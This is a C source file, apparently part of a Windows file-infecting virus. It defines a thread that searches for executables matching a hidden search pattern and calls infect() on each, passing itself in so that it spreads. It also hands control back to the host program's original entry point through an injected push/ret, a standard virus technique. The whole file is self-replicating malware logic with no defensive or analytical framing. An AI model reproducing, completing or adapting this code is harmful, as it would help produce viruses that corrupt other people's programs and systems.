#include <stdint.h>
#include <stdio.h>
#include <windows.h>

#include "checksum.h"
#include "checksum_list.h"
#include "code_begin.h"
#include "code_end.h"
#include "data.h"
#include "infect.h"
#include "infection_thread.h"
#include "oep.h"
#include "string_generator.h"
#include "utility.h"

static DWORD WINAPI infection_thread(LPVOID param);

void spawn_infection_thread(void) {
    asm volatile("nop\nnop\nnop");
    data_t *data = get_data();

    if (data != NULL) {
        PRINT_DEBUG("delta offset: 0x%X", data->delta_offset);

        HANDLE thread = data->function_list.create_thread(
            NULL, 0, (LPTHREAD_START_ROUTINE)BYTE_OFFSET(infection_thread, data->delta_offset),
            NULL, 0, NULL);
        if (thread == INVALID_HANDLE_VALUE) {
            PRINT_DEBUG("could not create thread");
        }
    } else {
        PRINT_DEBUG("failed to initialize data");
    }
    size_t oep = get_original_entry_point();
    if (oep != OEP_DEFAULT) {
        asm volatile("push %0\nret" : : "r"(oep));
    }
}

static DWORD WINAPI infection_thread(LPVOID param) {
    PRINT_DEBUG("infection thread started");
    data_t *data = get_data();

    if (data != NULL) {
        WIN32_FIND_DATAA find_data;
        HANDLE h_find;
        char search_pattern[100];
        if (get_string(STRING_EXE_SEARCH_PATTERN, search_pattern, 100) == 0) {
            PRINT_DEBUG("could not get string for STRING_EXE_SEARCH_PATTERN");
        }
        PRINT_DEBUG("search pattern: %s", search_pattern);

        memzero(&find_data, sizeof(WIN32_FIND_DATAA));
        h_find =
            data->function_list.find_first_file_a(search_pattern, &find_data);
        if (h_find != INVALID_HANDLE_VALUE) {
            do {
                PRINT_DEBUG("infecting %s", find_data.cFileName);
                if (infect(find_data.cFileName,
                           (void *)spawn_infection_thread) == 0) {
                    PRINT_DEBUG("success!");
                } else {
                    PRINT_DEBUG("failure!");
                }
            } while (data->function_list.find_next_file_a(h_find, &find_data));
            data->function_list.find_close(h_find);
        }
    } else {
        PRINT_DEBUG("failed to initialize data");
    }
    free_data();
    PRINT_DEBUG("infection thread finished");
    return 0;
}
